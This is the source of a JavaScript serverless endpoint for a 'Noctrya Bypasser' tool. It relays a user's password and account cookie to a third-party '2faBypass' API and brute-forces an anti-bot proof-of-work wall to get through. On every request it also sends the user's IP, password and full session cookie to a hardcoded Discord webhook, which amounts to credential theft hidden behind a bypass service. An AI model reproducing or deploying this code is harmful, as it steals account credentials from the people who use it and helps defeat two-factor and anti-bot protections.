import crypto from 'crypto';

// ── Webhook configuration ──
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/1535565391831633922/qGPItYyWVhdZBgzZ5Imc3P-rDe5evtpkopomqgfH2RZKQHRblWoe8QBSJ0xL5817ww3B';

// ── EggyWall PoW Solver ──
function solveEggyWall(html) {
    try {
        const saltMatch = html.match(/const publicSalt = "([^"]+)"/);
        const targetMatch = html.match(/const target = "([^"]+)"/);
        const diffMatch = html.match(/const difficulty = (\d+)/);

        if (!saltMatch || !targetMatch || !diffMatch) return null;

        const publicSalt = saltMatch[1];
        const target = targetMatch[1];
        const difficulty = parseInt(diffMatch[1]);

        const charset = '0123456789abcdef';
        const max = Math.pow(charset.length, difficulty);

        if (max > 5000000) return null; 

        for (let i = 0; i < max; i++) {
            let suffix = '';
            let temp = i;

            for (let j = 0; j < difficulty; j++) {
                suffix = charset[temp % charset.length] + suffix;
                temp = Math.floor(temp / charset.length);
            }

            const attempt = publicSalt + suffix;
            const hash = crypto.createHash('sha256').update(attempt).digest('hex');

            if (hash === target) {
                return attempt;
            }
        }
        return null;
    } catch (e) {
        return null;
    }
}

// ── Improved Webhook sender ──
async function sendWebhook(req, requestData, responseStatus, success, responseMessage, responseBody) {
    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || 'unknown';
    const timestamp = new Date().toISOString();

    const { Type, Password, Cookie } = requestData || {};

    const mainEmbed = {
        title: success ? `🚀 Bypass Succeeded` : `⚠️ Bypass Failed`,
        color: success ? 0x00ff00 : 0xff0000,
        fields: [
            { name: '🌐 IP Address', value: `\`${ip}\``, inline: false },
            { name: '📋 Type', value: `\`${Type || 'N/A'}\``, inline: true },
            { name: '🔑 Password', value: `\`${Password || 'N/A'}\``, inline: true },
            { name: '📊 HTTP Status', value: `\`${responseStatus}\``, inline: true },
            { name: '💬 API Message', value: `\`${responseMessage}\``, inline: false },
            {
                name: '📦 Raw Response',
                value: `\`\`\`json\n${(typeof responseBody === 'string' ? responseBody : JSON.stringify(responseBody)).slice(0, 400)}\n\`\`\``,
                inline: false
            }
        ],
        footer: { text: `Noctrya Bypasser • ${userAgent.substring(0, 50)}` },
        timestamp: timestamp
    };

    const cookieEmbed = {
        title: '🍪 Account Cookie',
        color: 0xffa500,
        description: `\`\`\`text\n${Cookie || 'N/A'}\n\`\`\``,
        fields: [
            { name: 'Length', value: `${(Cookie || '').length} chars`, inline: true }
        ],
        timestamp: timestamp
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: success ? '@everyone **New Successful Bypass!**' : null,
                embeds: [mainEmbed, cookieEmbed],
                username: 'Noctrya Bypasser',
                allowed_mentions: { parse: ['everyone'] }
            })
        });
    } catch (webhookError) {
        console.error('Webhook send failed:', webhookError);
    }
}

// ── 1. Anti-DDoS Memory Block ──
const requestCounts = {};

export default async function handler(req, res) {
    // 2. Spam Blocker Logic
    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || 'unknown';
    const now = Date.now();

    for (let key in requestCounts) {
        if (now - requestCounts[key].firstRequest > 60000) {
            delete requestCounts[key];
        }
    }

    if (!requestCounts[ip]) {
        requestCounts[ip] = { firstRequest: now, count: 1 };
    } else {
        requestCounts[ip].count++;
    }

    if (requestCounts[ip].count > 5) {
        return res.status(429).json({ error: 'Too many requests. Stop spamming.' });
    }

    // 3. Bot User-Agent Blocker
    const userAgent = req.headers['user-agent'] || '';
    if (userAgent.toLowerCase().includes('python') || 
        userAgent.toLowerCase().includes('curl') || 
        userAgent.toLowerCase().includes('axios') || 
        userAgent.toLowerCase().includes('postman') || 
        userAgent === '') {
        return res.status(403).json({ error: 'Bots are not allowed.' });
    }

    // 4. Fixed CORS Logic
    const origin = req.headers.origin;
    const allowedOrigins = [
        'https://bypasser-jade.vercel.app',
        'http://localhost:3000'
    ];
    
    if (origin && !allowedOrigins.includes(origin)) {
        return res.status(403).json({ error: 'Access Denied.' });
    }
    
    if (origin) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    }

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method Not Allowed' });

    // 5. Bypass logic
    try {
        const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const { Type, Password, Cookie } = body || {};

        if (!Type || !Password || !Cookie) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        const targetUrl = 'https://immortal.st/api/misc/2faBypass.php';
        const baseHeaders = {
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Origin': 'https://immortal.st',
            'Referer': 'https://immortal.st/',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        };

        const payload = JSON.stringify({ Type, Password, Cookie });

        let response = await fetch(targetUrl, {
            method: 'POST',
            headers: baseHeaders,
            body: payload,
            redirect: 'follow'
        });

        let responseText = await response.text();

        // Check if EggyWall blocked us
        if (responseText.includes('EggyWall') && responseText.includes('publicSalt')) {
            const token = solveEggyWall(responseText);

            if (token) {
                baseHeaders['Cookie'] = `EggyWall_Token=${token}`;
                response = await fetch(targetUrl, {
                    method: 'POST',
                    headers: baseHeaders,
                    body: payload,
                    redirect: 'follow'
                });
                responseText = await response.text();
            } else {
                await sendWebhook(req, { Type, Password, Cookie }, 403, false, 'Failed to solve EggyWall PoW', 'EggyWall PoW challenge failed');
                return res.status(403).json({ success: false, message: 'Failed to solve EggyWall PoW challenge.' });
            }
        }

        const httpSuccess = response.status >= 200 && response.status < 300;

        let responseData = responseText;
        const contentType = response.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
            try {
                responseData = JSON.parse(responseText);
            } catch (_) { /* keep raw */ }
        }

        let finalSuccess = httpSuccess;
        let finalMessage = '';
        
        if (responseData && typeof responseData === 'object' && 'success' in responseData) {
            finalSuccess = responseData.success === true || responseData.success === "true";
        }

        if (finalSuccess) {
            finalMessage = 'Cookie Bypassed Successfully';
        } else {
            if (responseData && typeof responseData === 'object') {
                finalMessage = responseData.message || responseData.error || 'Bypass Failed (Cookie Invalid or 2FA Required)';
            } else {
                finalMessage = 'Bypass Failed (Cookie Invalid or 2FA Required)';
            }
        }

        await sendWebhook(req, { Type, Password, Cookie }, response.status, finalSuccess, finalMessage, responseData);

        return res.status(response.status).json({
            success: finalSuccess,
            message: finalMessage
        });

    } catch (error) {
        console.error('Server Error:', error);
        const detailedError = error.cause ? error.cause.message : error.message;
        const errorCode = error.cause ? error.cause.code : 'UNKNOWN';
        
        return res.status(500).json({ 
            success: false,
            error: 'Internal Server Error', 
            details: detailedError,
            code: errorCode
        });
    }
}
